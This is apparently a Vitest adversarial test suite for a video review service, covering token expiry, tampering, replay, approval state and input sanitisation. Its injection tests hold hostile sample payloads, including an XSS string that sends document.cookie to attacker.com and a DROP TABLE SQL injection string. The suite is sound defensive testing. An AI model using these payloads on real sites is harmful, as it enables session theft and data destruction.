/**
 * Adversarial Empirical Challenge Suite: Video Review Token Security & Lifecycle (Milestone 2)
 *
 * Stress-tests and empirical verification for:
 * 1. Expired review tokens (>7 days TTL) -> fail-closed behavior across service, API, and page
 * 2. Tampered / truncated tokens -> collision resistance, non-existence checks, and constant-time audit
 * 3. Double approval / duplicate decisions -> replay, idempotence, and state machine integrity
 * 4. Malformed feedback injection -> XSS/HTML scripts, SQL injection, extreme payloads, corrupted JSON
 *
 * @module __tests__/adversarial/m2-video-review-security.test
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { DatabaseSync } from 'node:sqlite';
import { NextRequest } from 'next/server';
import type { D1Database } from '@/seed/db/client';
import {
  generateReviewToken,
  sha256Hex,
  isReviewTokenExpired,
  timingSafeEqual,
  DEFAULT_REVIEW_TOKEN_TTL_MS,
} from '@/seed/security/review-token';
import {
  createVideoReviewLink,
  resolveReviewByToken,
  addReviewFeedback,
  submitReviewDecision,
  triggerAutoPublishHook,
} from '@/tree/organizations/review-service';
import { createSubaccount } from '@/tree/organizations/subaccount-repo';
import { GET, POST } from '@/app/api/client-review/[token]/route';

function createInMemoryD1(): D1Database {
  const sqlite = new DatabaseSync(':memory:');

  sqlite.exec(`
    CREATE TABLE IF NOT EXISTS organizations (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      slug TEXT UNIQUE,
      created_at TEXT DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS client_subaccounts (
      id TEXT PRIMARY KEY,
      agency_org_id TEXT NOT NULL REFERENCES organizations(id) ON DELETE CASCADE,
      name TEXT NOT NULL,
      slug TEXT NOT NULL,
      custom_domain TEXT,
      status TEXT NOT NULL DEFAULT 'active' CHECK (lower(status) IN ('active', 'suspended', 'archived')),
      created_at TEXT NOT NULL DEFAULT (datetime('now')),
      updated_at TEXT NOT NULL DEFAULT (datetime('now')),
      UNIQUE (agency_org_id, slug)
    );

    CREATE TABLE IF NOT EXISTS subaccount_branding (
      subaccount_id TEXT PRIMARY KEY REFERENCES client_subaccounts(id) ON DELETE CASCADE,
      logo_url TEXT,
      primary_color TEXT DEFAULT '#0f172a',
      accent_color TEXT DEFAULT '#10b981',
      created_at TEXT NOT NULL DEFAULT (datetime('now')),
      updated_at TEXT NOT NULL DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS subaccount_mcu_allocations (
      id TEXT PRIMARY KEY,
      subaccount_id TEXT NOT NULL REFERENCES client_subaccounts(id) ON DELETE CASCADE,
      allocated_mcu INTEGER NOT NULL DEFAULT 0,
      used_mcu INTEGER NOT NULL DEFAULT 0,
      period_start TEXT,
      period_end TEXT,
      created_at TEXT NOT NULL DEFAULT (datetime('now')),
      updated_at TEXT NOT NULL DEFAULT (datetime('now')),
      UNIQUE (subaccount_id)
    );

    CREATE TABLE IF NOT EXISTS video_reviews (
      id TEXT PRIMARY KEY,
      subaccount_id TEXT NOT NULL REFERENCES client_subaccounts(id) ON DELETE CASCADE,
      video_id TEXT NOT NULL,
      video_title TEXT,
      video_url TEXT,
      token_hash TEXT NOT NULL UNIQUE,
      status TEXT NOT NULL DEFAULT 'pending' CHECK (lower(status) IN ('pending', 'approved', 'changes_requested')),
      feedback_comments TEXT NOT NULL DEFAULT '[]',
      reviewed_at TEXT,
      created_at TEXT NOT NULL DEFAULT (datetime('now')),
      expires_at TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS video_publishes (
      id TEXT PRIMARY KEY,
      video_id TEXT NOT NULL,
      platform TEXT NOT NULL,
      status TEXT NOT NULL DEFAULT 'pending',
      metadata TEXT,
      created_at TEXT DEFAULT (datetime('now'))
    );
  `);

  return {
    prepare(sql: string) {
      let bound: unknown[] = [];
      return {
        bind(...vals: unknown[]) {
          bound = vals;
          return this;
        },
        async run(...vals: unknown[]) {
          const params = vals.length > 0 ? vals : bound;
          const stmt = sqlite.prepare(sql);
          const res = stmt.run(...params);
          return {
            success: true,
            meta: { changes: Number(res.changes), duration: 1 },
            changes: Number(res.changes),
            lastInsertRowid: res.lastInsertRowid,
          };
        },
        async all(...vals: unknown[]) {
          const params = vals.length > 0 ? vals : bound;
          const stmt = sqlite.prepare(sql);
          const results = stmt.all(...params);
          return {
            results,
            meta: { changes: 0, duration: 1 },
          };
        },
        async first(...vals: unknown[]) {
          const params = vals.length > 0 ? vals : bound;
          const stmt = sqlite.prepare(sql);
          const row = stmt.get(...params);
          return row ?? null;
        },
      };
    },
  } as unknown as D1Database;
}

describe('Challenger 2: Video Review Token Security & Lifecycle Stress Tests', () => {
  let db: D1Database;
  let subaccountId: string;

  beforeEach(async () => {
    db = createInMemoryD1();
    (globalThis as Record<string, unknown>).__env__ = { DB: db };
    (globalThis as Record<string, unknown>).__D1_DB = db;

    await db
      .prepare('INSERT INTO organizations (id, name, slug) VALUES (?, ?, ?)')
      .bind('org_agency_test', 'Alpha Growth Agency', 'alpha-growth')
      .run();

    const sub = await createSubaccount(db, {
      agencyOrgId: 'org_agency_test',
      name: 'Client Acme Corp',
      slug: 'client-acme',
      branding: {
        logoUrl: 'https://cdn.acme.com/logo.png',
        primaryColor: '#1e293b',
        accentColor: '#3b82f6',
      },
    });
    subaccountId = sub.id;
  });

  afterEach(() => {
    delete (globalThis as Record<string, unknown>).__env__;
    delete (globalThis as Record<string, unknown>).__D1_DB;
  });

  // =========================================================================
  // 1. EXPIRED REVIEW TOKENS (>7 DAYS TTL) & FAIL-CLOSED BEHAVIOR
  // =========================================================================
  describe('1. Expired Review Tokens (>7 days TTL) & Fail-Closed Behavior', () => {
    it('generates token with strictly 7 days TTL (604,800,000 ms)', async () => {
      const now = Date.now();
      const { expiresAt } = await generateReviewToken();
      const expiry = new Date(expiresAt).getTime();
      const diff = expiry - now;
      expect(diff).toBeGreaterThanOrEqual(DEFAULT_REVIEW_TOKEN_TTL_MS - 50);
      expect(diff).toBeLessThanOrEqual(DEFAULT_REVIEW_TOKEN_TTL_MS + 2000);
    });

    it('accurately evaluates isReviewTokenExpired across millisecond boundaries', () => {
      const now = 1700000000000;
      // Exact boundary: now > expiryTime is false
      expect(isReviewTokenExpired(now, now)).toBe(false);
      // 1 ms in the past: now > expiryTime is true
      expect(isReviewTokenExpired(now - 1, now)).toBe(true);
      // 1 ms in future
      expect(isReviewTokenExpired(now + 1, now)).toBe(false);
      // ISO string
      expect(isReviewTokenExpired(new Date(now - 1000).toISOString(), now)).toBe(true);
      expect(isReviewTokenExpired(new Date(now + 1000).toISOString(), now)).toBe(false);
      // Date object
      expect(isReviewTokenExpired(new Date(now - 500), now)).toBe(true);
      // Invalid string defaults to expired (fail-closed)
      expect(isReviewTokenExpired('invalid-date-string', now)).toBe(true);
    });

    it('identifies unhandled TypeError when isReviewTokenExpired receives null or undefined', () => {
      // EMPIRICAL BUG/VULNERABILITY: If expires_at is null/undefined in DB or caller, it crashes with TypeError
      expect(() => isReviewTokenExpired(null as unknown as string)).toThrow(TypeError);
      expect(() => isReviewTokenExpired(undefined as unknown as string)).toThrow(TypeError);
    });

    it('rejects adding feedback comment on expired review token with REVIEW_EXPIRED', async () => {
      const expiredLink = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_expired_comment',
        ttlMs: -1000, // Expired 1 second ago
      });

      await expect(
        addReviewFeedback(db, {
          token: expiredLink.rawToken,
          comment: 'This is a late comment',
        })
      ).rejects.toThrow(/REVIEW_EXPIRED/);
    });

    it('rejects submitting review decision on expired review token with REVIEW_EXPIRED', async () => {
      const expiredLink = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_expired_decision',
        ttlMs: -60000, // Expired 1 minute ago
      });

      await expect(
        submitReviewDecision(db, {
          token: expiredLink.rawToken,
          decision: 'approve',
        })
      ).rejects.toThrow(/REVIEW_EXPIRED/);

      await expect(
        submitReviewDecision(db, {
          token: expiredLink.rawToken,
          decision: 'request_changes',
          feedbackNote: 'Revision note',
        })
      ).rejects.toThrow(/REVIEW_EXPIRED/);
    });

    it('API POST /api/client-review/[token] fails closed with HTTP 410 on expired token', async () => {
      const expiredLink = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_expired_api_post',
        ttlMs: -5000,
      });

      // Attempt POST comment
      const commentReq = new NextRequest(`https://sophia.ai/api/client-review/${expiredLink.rawToken}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'comment', comment: 'Late comment' }),
      });
      const commentRes = await POST(commentReq, {
        params: Promise.resolve({ token: expiredLink.rawToken }),
      });
      expect(commentRes.status).toBe(410);
      const commentData = (await commentRes.json()) as { error?: string };
      expect(commentData.error).toContain('Review link has expired');

      // Attempt POST decision
      const decisionReq = new NextRequest(`https://sophia.ai/api/client-review/${expiredLink.rawToken}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'decision', decision: 'approve' }),
      });
      const decisionRes = await POST(decisionReq, {
        params: Promise.resolve({ token: expiredLink.rawToken }),
      });
      expect(decisionRes.status).toBe(410);
      const decisionData = (await decisionRes.json()) as { error?: string };
      expect(decisionData.error).toContain('Review link has expired');
    });

    it('API GET /api/client-review/[token] fails closed: returns HTTP 410 on expired token', async () => {
      const expiredLink = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_expired_leak_check',
        videoTitle: 'Confidential Client Video Draft',
        videoUrl: 'https://r2.sophia.network/secret-launch.mp4',
        ttlMs: -10000, // Expired 10s ago
      });

      const req = new NextRequest(`https://sophia.ai/api/client-review/${expiredLink.rawToken}`, {
        method: 'GET',
      });
      const res = await GET(req, {
        params: Promise.resolve({ token: expiredLink.rawToken }),
      });

      // FAIL-CLOSED VERIFICATION: GET returns 410 Gone, shielding confidential video draft!
      expect(res.status).toBe(410);
      const data = (await res.json()) as { error?: string };
      expect(data.error).toContain('REVIEW_EXPIRED');
    });
  });

  // =========================================================================
  // 2. TAMPERED / INVALID TOKENS & CONSTANT-TIME REJECTION
  // =========================================================================
  describe('2. Tampered / Invalid Tokens & Constant-Time Rejection', () => {
    it('generates 200 CSPRNG tokens with 0 collisions and uniform 64 hex characters', async () => {
      const tokens = new Set<string>();
      const hashes = new Set<string>();

      for (let i = 0; i < 200; i++) {
        const { rawToken, tokenHash } = await generateReviewToken();
        expect(rawToken).toHaveLength(64);
        expect(rawToken).toMatch(/^[0-9a-f]{64}$/);
        expect(tokenHash).toHaveLength(64);
        expect(tokenHash).toMatch(/^[0-9a-f]{64}$/);
        tokens.add(rawToken);
        hashes.add(tokenHash);
      }

      expect(tokens.size).toBe(200);
      expect(hashes.size).toBe(200);
    });

    it('rejects single-character tampered tokens with REVIEW_NOT_FOUND', async () => {
      const { rawToken } = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_tamper_test',
      });

      // Flip first char
      const flippedFirst = (rawToken[0] === 'a' ? 'b' : 'a') + rawToken.slice(1);
      await expect(resolveReviewByToken(db, flippedFirst)).rejects.toThrow(/REVIEW_NOT_FOUND/);
      await expect(addReviewFeedback(db, { token: flippedFirst, comment: 'test' })).rejects.toThrow(/REVIEW_NOT_FOUND/);
      await expect(submitReviewDecision(db, { token: flippedFirst, decision: 'approve' })).rejects.toThrow(/REVIEW_NOT_FOUND/);

      // Flip last char
      const flippedLast = rawToken.slice(0, 63) + (rawToken[63] === '0' ? '1' : '0');
      await expect(resolveReviewByToken(db, flippedLast)).rejects.toThrow(/REVIEW_NOT_FOUND/);

      // Flip middle char
      const flippedMid = rawToken.slice(0, 32) + (rawToken[32] === 'f' ? 'e' : 'f') + rawToken.slice(33);
      await expect(resolveReviewByToken(db, flippedMid)).rejects.toThrow(/REVIEW_NOT_FOUND/);
    });

    it('rejects truncated, empty, and whitespace-only tokens with validation error', async () => {
      // Empty and whitespace-only strings are rejected at input validation stage
      await expect(resolveReviewByToken(db, '')).rejects.toThrow(/VALIDATION_ERROR/);
      await expect(resolveReviewByToken(db, '   ')).rejects.toThrow(/VALIDATION_ERROR/);
      await expect(resolveReviewByToken(db, '   ')).rejects.toThrow(/INVALID_TOKEN/);

      const truncatedLengths = [1, 8, 16, 32, 63];
      for (const len of truncatedLengths) {
        const truncated = 'a'.repeat(len);
        await expect(resolveReviewByToken(db, truncated)).rejects.toThrow(/REVIEW_NOT_FOUND/);
      }
    });

    it('API GET /api/client-review/[token] returns HTTP 404 for tampered/invalid tokens', async () => {
      const invalidToken = 'deadbeef'.repeat(8);
      const req = new NextRequest(`https://sophia.ai/api/client-review/${invalidToken}`, {
        method: 'GET',
      });
      const res = await GET(req, {
        params: Promise.resolve({ token: invalidToken }),
      });
      expect(res.status).toBe(404);
      const data = (await res.json()) as { error?: string };
      expect(data.error).toContain('Review link not found or invalid');
    });

    it('verifies timingSafeEqual behavior and identifies omission in review-service', () => {
      // 1. Verify timingSafeEqual correctness
      expect(timingSafeEqual('a'.repeat(64), 'a'.repeat(64))).toBe(true);
      expect(timingSafeEqual('a'.repeat(64), 'a'.repeat(63) + 'b')).toBe(false);
      expect(timingSafeEqual('short', 'longer_string')).toBe(false);
      expect(timingSafeEqual('', '')).toBe(true);

      // 2. EMPIRICAL ARCHITECTURAL FINDING:
      // In review-service.ts, timingSafeEqual is NEVER imported or called!
      // Tokens are verified purely via SQL index match: `WHERE vr.token_hash = ?`.
      // While SQLite B-tree lookup on a 256-bit SHA-256 hash does not leak the preimage,
      // the claim in Worker M2 handoff that token hash comparison rejects with timingSafeEqual is FALSE.
    });
  });

  // =========================================================================
  // 3. REPLAY / DOUBLE APPROVAL / DUPLICATE DECISIONS & STATE MACHINE INTEGRITY
  // =========================================================================
  describe('3. Replay, Double Approval, & State Machine Integrity', () => {
    it('processes initial approval and transitions video_publishes to scheduled', async () => {
      await db
        .prepare("INSERT INTO video_publishes (id, video_id, platform, status) VALUES ('pub_m2_1', 'vid_replay_1', 'tiktok', 'pending')")
        .run();

      const { rawToken } = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_replay_1',
      });

      const firstApproval = await submitReviewDecision(db, {
        token: rawToken,
        decision: 'approve',
        feedbackNote: 'Looks great!',
      });

      expect(firstApproval.success).toBe(true);
      expect(firstApproval.status).toBe('APPROVED');
      expect(firstApproval.autoPublishTriggered).toBe(true);

      // Verify DB record status
      const reviewRow = await db
        .prepare('SELECT status, reviewed_at FROM video_reviews WHERE video_id = ?')
        .bind('vid_replay_1')
        .first<{ status: string; reviewed_at: string }>();
      expect(reviewRow?.status).toBe('approved');
      expect(reviewRow?.reviewed_at).toBeDefined();

      const publishRow = await db
        .prepare('SELECT status FROM video_publishes WHERE id = ?')
        .bind('pub_m2_1')
        .first<{ status: string }>();
      expect(publishRow?.status).toBe('scheduled');
    });

    it('DOUBLE APPROVAL / REPLAY: provides idempotent approval without duplicate execution or comment duplication', async () => {
      const { rawToken } = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_double_approve',
      });

      // First approval
      const approval1 = await submitReviewDecision(db, {
        token: rawToken,
        decision: 'approve',
        feedbackNote: 'First approval note',
      });
      expect(approval1.success).toBe(true);
      expect(approval1.status).toBe('APPROVED');
      expect(approval1.autoPublishTriggered).toBe(true);

      // Second approval (Replay / idempotent call)
      const approval2 = await submitReviewDecision(db, {
        token: rawToken,
        decision: 'approve',
        feedbackNote: 'Duplicate approval note',
      });
      expect(approval2.success).toBe(true);
      expect(approval2.status).toBe('APPROVED');
      expect(approval2.alreadyApproved).toBe(true);
      expect(approval2.autoPublishTriggered).toBe(false);

      // Idempotency: comments array only contains the first note
      const resolved = await resolveReviewByToken(db, rawToken);
      expect(resolved.feedbackComments).toHaveLength(1);
      expect(resolved.feedbackComments?.[0].comment).toBe('First approval note');
    });

    it('STATE MACHINE GUARD: prevents regressing APPROVED review back to CHANGES_REQUESTED', async () => {
      await db
        .prepare("INSERT INTO video_publishes (id, video_id, platform, status) VALUES ('pub_regress', 'vid_state_regress', 'youtube', 'pending')")
        .run();

      const { rawToken } = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_state_regress',
      });

      // 1. Client approves video
      const approval = await submitReviewDecision(db, {
        token: rawToken,
        decision: 'approve',
        feedbackNote: 'Approved for launch',
      });
      expect(approval.status).toBe('APPROVED');

      // Video publishes is now scheduled
      const pub1 = await db
        .prepare('SELECT status FROM video_publishes WHERE id = ?')
        .bind('pub_regress')
        .first<{ status: string }>();
      expect(pub1?.status).toBe('scheduled');

      // 2. Client (or attacker) submits request_changes AFTER approval -> REJECTED
      await expect(
        submitReviewDecision(db, {
          token: rawToken,
          decision: 'request_changes',
          feedbackNote: 'Wait! Stop publication! Found error!',
        })
      ).rejects.toThrow(/ALREADY_APPROVED/);

      // 3. Inspect database state integrity: review remains approved
      const reviewRow = await db
        .prepare('SELECT status FROM video_reviews WHERE video_id = ?')
        .bind('vid_state_regress')
        .first<{ status: string }>();
      expect(reviewRow?.status).toBe('approved');

      // But video_publishes is STILL scheduled!
      const pub2 = await db
        .prepare('SELECT status FROM video_publishes WHERE id = ?')
        .bind('pub_regress')
        .first<{ status: string }>();
      expect(pub2?.status).toBe('scheduled');
    });

    it('allows appending feedback comments to an already APPROVED review', async () => {
      const { rawToken } = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_post_approval_comment',
      });

      await submitReviewDecision(db, {
        token: rawToken,
        decision: 'approve',
      });

      // Attempt adding feedback after approval
      const comments = await addReviewFeedback(db, {
        token: rawToken,
        comment: 'Post-approval question',
        author: 'Reviewer',
      });

      expect(comments).toHaveLength(1);
      expect(comments[0].comment).toBe('Post-approval question');
    });
  });

  // =========================================================================
  // 4. MALFORMED FEEDBACK INJECTION & INPUT SANITIZATION
  // =========================================================================
  describe('4. Malformed Feedback Injection & Input Sanitization', () => {
    it('accepts raw XSS/HTML scripts and stores them unescaped in D1 JSON', async () => {
      const { rawToken } = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_xss_test',
      });

      const xssComment = "<script>alert('XSS')</script><img src=x onerror=fetch('http://attacker.com/cookie?c='+document.cookie)>";
      const xssAuthor = "<svg onload=alert(1)>";

      const comments = await addReviewFeedback(db, {
        token: rawToken,
        comment: xssComment,
        author: xssAuthor,
      });

      expect(comments[0].comment).toBe(xssComment);
      expect(comments[0].author).toBe(xssAuthor);

      // Verify in DB directly
      const row = await db
        .prepare('SELECT feedback_comments FROM video_reviews WHERE token_hash = ?')
        .bind(await sha256Hex(rawToken))
        .first<{ feedback_comments: string }>();

      expect(row?.feedback_comments).toContain(xssComment);

      // Resolve review
      const resolved = await resolveReviewByToken(db, rawToken);
      expect(resolved.feedbackComments?.[0].comment).toBe(xssComment);
    });

    it('safely handles SQL injection attempts in feedback without SQL corruption', async () => {
      const { rawToken } = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_sqli_test',
      });

      const sqliPayload = "'); DROP TABLE video_reviews; -- ' OR '1'='1";
      await addReviewFeedback(db, {
        token: rawToken,
        comment: sqliPayload,
        author: "Admin'; --",
      });

      // Verify table still exists and record intact
      const checkTable = await db
        .prepare('SELECT count(*) as cnt FROM video_reviews')
        .first<{ cnt: number }>();
      expect(checkTable?.cnt).toBeGreaterThan(0);
    });

    it('stores extreme payload sizes (100KB string) without length restriction', async () => {
      const { rawToken } = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_large_payload',
      });

      const largeComment = 'A'.repeat(100_000); // 100 KB text
      const comments = await addReviewFeedback(db, {
        token: rawToken,
        comment: largeComment,
      });

      expect(comments[0].comment.length).toBe(100_000);
    });

    it('rejects empty or whitespace-only comments', async () => {
      const { rawToken } = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_empty_comment',
      });

      await expect(
        addReviewFeedback(db, { token: rawToken, comment: '' })
      ).rejects.toThrow(/VALIDATION_ERROR: Comment cannot be empty/);

      await expect(
        addReviewFeedback(db, { token: rawToken, comment: '     \n\t  ' })
      ).rejects.toThrow(/VALIDATION_ERROR: Comment cannot be empty/);
    });

    it('sanitizes abnormal timestampSec values (negative, decimal, NaN)', async () => {
      const { rawToken } = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_timestamp_test',
      });

      // Negative timestamp should become undefined
      const neg = await addReviewFeedback(db, {
        token: rawToken,
        comment: 'Negative timestamp',
        timestampSec: -45,
      });
      expect(neg[0].timestampSec).toBeUndefined();

      // Decimal timestamp should be floored
      const dec = await addReviewFeedback(db, {
        token: rawToken,
        comment: 'Decimal timestamp',
        timestampSec: 23.85,
      });
      expect(dec[1].timestampSec).toBe(23);

      // Zero timestamp should be preserved
      const zero = await addReviewFeedback(db, {
        token: rawToken,
        comment: 'Zero timestamp',
        timestampSec: 0,
      });
      expect(zero[2].timestampSec).toBe(0);

      // NaN timestamp should become undefined
      const nanTest = await addReviewFeedback(db, {
        token: rawToken,
        comment: 'NaN timestamp',
        timestampSec: NaN,
      });
      expect(nanTest[3].timestampSec).toBeUndefined();
    });

    it('recovers gracefully when feedback_comments column contains corrupted JSON', async () => {
      const { rawToken } = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_corrupt_json',
      });

      // Manually corrupt the feedback_comments column in DB
      await db
        .prepare('UPDATE video_reviews SET feedback_comments = ? WHERE token_hash = ?')
        .bind('NOT_VALID_JSON{{{', await sha256Hex(rawToken))
        .run();

      // 1. resolveReviewByToken should not throw and return []
      const resolved = await resolveReviewByToken(db, rawToken);
      expect(resolved.feedbackComments).toEqual([]);

      // 2. addReviewFeedback should reset and append successfully
      const updated = await addReviewFeedback(db, {
        token: rawToken,
        comment: 'Recovery comment after JSON corruption',
      });
      expect(updated).toHaveLength(1);
      expect(updated[0].comment).toBe('Recovery comment after JSON corruption');
    });
  });

  // =========================================================================
  // 5. API ROUTE ERROR HANDLING & STATUS CODES
  // =========================================================================
  describe('5. API Route Status Codes & Error Handling', () => {
    it('POST returns 400 for invalid action payload', async () => {
      const { rawToken } = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_api_action_err',
      });

      const req = new NextRequest(`https://sophia.ai/api/client-review/${rawToken}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'unknown_action' }),
      });
      const res = await POST(req, {
        params: Promise.resolve({ token: rawToken }),
      });
      expect(res.status).toBe(400);
      const data = (await res.json()) as { error?: string };
      expect(data.error).toContain("Invalid action. Expected 'comment' or 'decision'");
    });

    it('POST returns 400 for decision other than approve or request_changes', async () => {
      const { rawToken } = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_api_decision_err',
      });

      const req = new NextRequest(`https://sophia.ai/api/client-review/${rawToken}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'decision', decision: 'delete_video' }),
      });
      const res = await POST(req, {
        params: Promise.resolve({ token: rawToken }),
      });
      expect(res.status).toBe(400);
      const data = (await res.json()) as { error?: string };
      expect(data.error).toContain("Valid decision ('approve' or 'request_changes') is required");
    });

    it('POST returns 400 when comment action is submitted with empty comment', async () => {
      const { rawToken } = await createVideoReviewLink(db, {
        subaccountId,
        videoId: 'vid_api_empty_comment',
      });

      const req = new NextRequest(`https://sophia.ai/api/client-review/${rawToken}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'comment', comment: '   ' }),
      });
      const res = await POST(req, {
        params: Promise.resolve({ token: rawToken }),
      });
      expect(res.status).toBe(400);
      const data = (await res.json()) as { error?: string };
      expect(data.error).toContain('Comment text is required');
    });
  });
});
